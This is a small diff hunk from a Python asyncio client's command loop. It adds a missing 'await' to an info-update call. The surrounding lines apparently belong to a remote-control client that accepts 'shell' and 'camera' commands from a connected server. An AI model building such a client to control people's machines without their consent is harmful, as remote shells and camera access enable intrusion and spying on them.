@@ -286,7 +286,7 @@ class Client:
                             sys.exit()
                     data = data.decode()
                     if data == 'info':
-                       self.UpdateInfoAndSend()
+                       await self.UpdateInfoAndSend()
                     elif data == 'shell':
                         await self.shell_session(self.reader,self.writer)
                     elif data == 'camera':
